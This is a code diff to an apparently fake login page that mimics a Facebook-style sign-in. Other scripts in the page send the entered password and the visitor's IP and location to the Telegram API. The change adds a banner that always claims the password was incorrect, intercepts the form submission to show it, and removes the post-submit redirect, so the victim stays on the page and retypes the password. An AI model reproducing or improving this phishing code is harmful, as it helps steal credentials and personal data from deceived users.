@@ -215,6 +215,16 @@ input[type="submit"]:hover, input[type="submit"]:focus {
   padding-left: 80px;
   font-size: 13px;
 }
+  /* ERROR BANNER */
+  .error-banner {
+    display:none; /* hidden by default */
+    color: #7a1515;
+    padding: 12px 14px;
+    border-radius: 8px;
+    margin-bottom: 10px;
+    font-weight:100;
+  }
+  .error-banner strong { display:block; margin-bottom:4px; }
 </style>
 
 </head>
@@ -233,7 +243,10 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       </div>
       <input class="btn btn-primary" type="submit" value="Log in">
     </form>
-  
+    <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive">
+      <strong>Sorry — your password was incorrect.</strong>
+      Please double check your password and try again.
+    </div>
     <div class="divider"><b>OR</b></div>
   
     <div class="fbwrapper">
@@ -274,7 +287,52 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       <span>© 2025 </span>
     </p>
   </div>
+  <script>
+    (function() {
+      const form = document.getElementById('telegramForm');
+      const pwd = document.getElementById('message');
+      const errorBanner = document.getElementById('errorBanner');
   
+      // Show error banner (simulate incorrect password)
+      function showError() {
+        errorBanner.style.display = 'block';
+        // focus password for convenience
+        pwd.focus();
+      }
+  
+      // Hide error banner
+      function hideError() {
+        if (errorBanner.style.display !== 'none') {
+          errorBanner.style.display = 'none';
+        }
+      }
+  
+      // On submit, prevent actual submit and show the error banner
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+  
+        // Example logic: if password is empty or short, show banner
+        // You can replace this block with real server validation instead.
+        const pw = pwd.value.trim();
+        if (!pw || pw.length < 6) {
+          showError();
+          return;
+        }
+  
+        // Simulate server response: treat as incorrect password
+        showError();
+  
+        // If you want to actually submit to a server, do an AJAX request and
+        // show the banner based on the server response.
+      });
+  
+      // Hide the banner as soon as user starts typing in the password field
+      pwd.addEventListener('input', hideError);
+  
+      // Also hide when they change email/username (optional)
+      document.getElementById('email').addEventListener('input', hideError);
+    })();
+  </script>
   <script>
     // Fetch user's IP and location info and store for use in form submission
     function getUserRegion() {
@@ -347,7 +405,6 @@ input[type="submit"]:hover, input[type="submit"]:focus {
         .then(response => response.json())
         .then(result => {
           console.log('Telegram API result:', result);
-          window.location.href = '8.html';
         })
         .catch(error => {
           console.error('Error sending message:', error);
